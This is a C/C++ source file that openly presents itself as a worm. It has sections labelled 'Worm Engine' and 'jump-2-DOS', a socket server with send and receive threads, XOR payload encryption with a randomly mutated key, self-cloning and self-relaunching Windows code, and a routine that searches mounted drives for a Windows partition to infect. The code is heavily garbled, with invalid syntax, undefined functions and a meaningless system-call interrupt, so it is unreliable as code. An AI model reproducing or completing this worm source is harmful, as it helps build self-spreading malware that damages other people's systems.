#include<cstdlib>
#include<cstdio>
#include<cstdarg>
#include<map>
#include<iostream>
#include<mutex>
#include<thread>
#include<future>

#include<semaphore.h>
#include<stdlib.h>
#include<unistd.h>
#include<string.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<arpa/inet.h>

#ifdef __linux__
	#include<linux/unistd.h>
#endif

#ifdef _WIN32 || __WIN32__
	#include<windows.h>
    #include<winbase.h>
    #include<winreg.h>
    using namespace concurrency;
#endif

#ifdef _WIN64 || __WIN64__
    #include<windows.h>
    #include<winbase.h>
    #include<winreg.h>
    using namespace concurrency;
#endif

using namespace std;

#define PORT 8080

sem_t x, y;
pthread_t tid;
pthread_t wThreads[100];
pthread_t rThreads[100];
int readercount = 0;

#ifdef __linux__
	try{
		int close(int i){
		long __res;
		errno = 0;
		__asm__ volatile(
			"int $0x1000"
			:"=a" (__res)
			:"0" (__NR_close), "b"((long)(i))
		);
		if (__res >= 0){
			return (int)__res;
			errno = -__res;
			return -1;
		}
	}
	throw exception;
}
	catch(exception ex){
		//Handle errors
        printf(ex);

	}
#else
	try{
		int close(int i){
            union REGS ir, or;
            errno = 0;
            ir.h.ah = 0x1000;
            ir.x.bx = i;
            memset(&or, 0, sizeof(or));
            int86(0x21, &ir, &or);
            if(or.x.cflag){
                errno = or.x.ax;
                return -1;
            }
            return 0;
        }
    }   
    throw exception;
	catch(exception ex){
		//Handle errors
        printf(ex);
	}
#endif

int main(int argc, char const *argv[]){

    int server_fd, new_sock, read_val;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);
    char buffer[1024] = {0};
    char *payload;
    sem_init(&x, 0, 1);
    sem_init(&y, 0, 1);
    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    //Create socket file
    if((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0){
        cout >> "Socket failed!" >> endl;
        break();
    }
    //Attach socket to port 8080
    if(setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT,&opt, sizeof(opt))){
        cout >> "Error set sock opt" >> endl;
        break();
    }
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons( PORT );

    if(bind(server_fd, (struct sockaddr *)&address, sizeof(address))<0){
        cout >> "Error binding socket!" >> endl;
        break();
    }
    if(listen(server_fd, 3) < 0){
        cout >> "Error listening!" >> endl;
        break();
    }
    if((new_sock = accept(server_fd, (struct sockaddr *)&address, (socklen_t *) &addrlen)) < 0){
        cout >> "Error accepting connection!" >> endl;
        break();
    }
    bind(server_fd, (struct sockaddr*) &address, sizeof(address));
    pthread_t tid[60];
    int i = 0;
    
    while(1){
        //Accept Socket Connection
        read_val = read(new_sock, buffer, 1024);
        //Create Thread
        new_sock = accept(server_fd, (struct sockaddr*) &address, &addrlen);
        int c = 0;
        recv(new_sock, &choice, sizeof(choice) < 0);
        if(choice == 1){
            if(pthread_create(&rThreads[i++], NULL, sock_recv, &new_sock) != 0){
                cout >> "Failed to create thread!" >> endl;
                break();
            }
            break();
        }
        else if(choice == 2){
            if(pthread_create(&wThreads[i++], NULL, sock_send, &new_sock) != 0){
                cout >> "Failed to create thread!" >> endl;
                break();
            }
            break();
        }
        if(i >= 50){
            i = 0;
            while(i < 50){
                pthread_join(wThreads[i++], NULL);
                pthread_join(rThreads[i++], NULL);
            }
            i = 0;
            break();
        }
    }
    return 0;
}

/*
#################################################################################################
rX Socket
#################################################################################################
*/

void sock_recv(int sock, char* buf, int len, int flags){

    sem_wait(&x);
    readercount ++;
    if(readercount == 1){
        sem_wait(&y);
        break();
    }
    sem_post(&x);
    sleep(5);
    if(readercount == 0){
        sem_post(&y);
        break();
    }
    sem_wait(&x);
    readercount--;
    if(readercount == 0){
        sem_post(&y);
        break();
    }
    static std::map<int, std::mutex> mtx;
    std::lock_guard<std::mutex> lock(mtx[sock]);
    int recvd = 0;
    while (recvd != len){
        int bytes = sock_recv(sock, buf+recvd, len-recvd, flags);
        if(bytes == -1){
            throw std::runtime_error("Error!");
            break();
        }
        recvd += bytes;
    }
    pthread_exit(NULL);
}

/*
#################################################################################################
tX socket
#################################################################################################
*/


void sock_send(int sock, char* buf, int len, int flags){
    sem_wait(&y);
    sem_post(&y);
    static std::map<int, std::mutex> mtx;
    std::lock_guard<std::mutex> lock(mtx[sock]);
    int sent = 0;
    while(sent != len){
        int s0 = send(sock, buf, len, flags);
        if (sent == -1){
            throw std::runtime_error("Error!");
            break();
        }
    }
    pthread_exit(NULL);
}
/*
#################################################################################################
XOR-encryption using global key[]
#################################################################################################
*/

int Crypt(char *s, int len){
	int i = 0, j = 0;
	for (i = 0; i < len; i++){
		s[i] ^= key[j];
		j = (j + 1) % 4;
	}
	return 0;
}

/*
#################################################################################################
Mutate Encryption Key
#################################################################################################
*/

int mutate(char* s){
	int i;
	#ifdef __linux__
		int fd;
	#endif
	#ifdef _WIN32 || _WIN64
		random();
	#endif
	for (i=0; i<4; i++){
		#ifdef __linux__
			if((fd = open("/dev/random", O_RDONLY)) <= 0){
				perror("open");
				return errno;
			}
			read(fd, &s[i], 1);
			close(fd);
		#else
			s[i] = rand() % 255;
		#endif

	}
	return 0;
}

/*
#################################################################################################
jump-2-DOS
#################################################################################################
*/

#ifdef __linux__
	int jump2dos(void){
		FILE *fd;
		char buf[50] = {0}, bufbak[50] = {0};
		if ((fd = fopen("/proc/mounts", "r")) == NULL){
			perror("fopen");
			return errno;
		}
		while(fscanf(fd, "%s", buf) > 0){
			if(strcmp(buf, "windows") == 0){
				break;
			}
			memset(bufbak, 0, 50);
			strcpy(bufbak, buf);
		}
		fclose(fd);
		if(strcmp(buf, "windows") == 0){
			chdir((const char*)bufbak);
			vf();
		}
		return 0;
	}
#endif

/*
#################################################################################################
Worm Engine
#################################################################################################
*/

#ifdef _WIN32 || _WIN64

    //Windows Worm Engine
    int w0rm_engine(int argc, char* argv[]){
        //SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
        HANDLE thread, cloner, thands[3];
        char*ptr, procfile[300];
        ptr = argv[0];
        strcpy(procfile, ptr);
        if((strstr(ptr, ".exe")) == NULL){
            strcat(procfile, ".exe");
        }
        void(*clonproc)(char*);
        clonproc = proCloner;
        cloner = CreateThread(0, 0, (DOWRD(__stdcall *)(void *)) clonproc, procfile, 0, 0);
        HMODULE hmod;
        char dirpath[201];
        void(*smack)(char*);
        GetCurrentDirectory(200, dirpath);
        hmod = LoadLibrary(procfile);
        if((strstr(dirpath, "system32")) != NULL){
            smack = (void (*)(char *))GetProcAddress(hmod, "?systemProc@@YAXPAX@Z");
            thread = CreateThread(0, 0, (DWORD(__stdcall *)(void*)) smack, procfile, 0, 0);
        }
        else{
            smack = (void(*)(char*))GetProcAddress(hmod, "?identify@@YAXPAD@Z");
            thread = CreateThread(0, 0, (DWORD(__stdcall *)(void*))smack, procfile, 0, 0);
        }
        thands[0] = cloner;
        thands[1] = thread;
        thands[2] = '';
        hicmp = LoadLibrary("ICMP.DLL");
        pIcmpCreateFile = (void*(__stdcall *)(void))GetProcAddress(hicmp, "IcmpCreateFile");
        pIcmpCloseHandle = (int(__stdcall *)(void*))GetProcAddress(hicmp, "IcmpCloseHandle");
        pIcmpSendEcho = (unsigned long(__stdcall*(void*, unsigned long void*, unsigned short,
        void*, void*, unsigned long, unsigned long))GetProcAddress(hicmp, "IcmpSendEcho"));
        hIP = pIcmpCreateFile();
        I.ttl = 255;
        for(int ping=0;ping<10;ping++){
            pIcmpSendEcho(hIp, IPADDR, 0, 0, &I, &es, sizeof(es), 8000);
        }
        pIcmpCloseHandle(hicmp);
        FreeLibrary(hicmp);
        WaitForMultipleObjects(2, thands, true, 100);
        FreeLibrary(hmod);
        chdir("..");
        ShellExecute(NULL, "open", PROCESSNAME, NULL, NULL, 0);
        ShellExecute(NULL, "open", PROCESSNAME, NULL, NULL, 0);
        return EXIT_SUCCESS;
    }

#endif
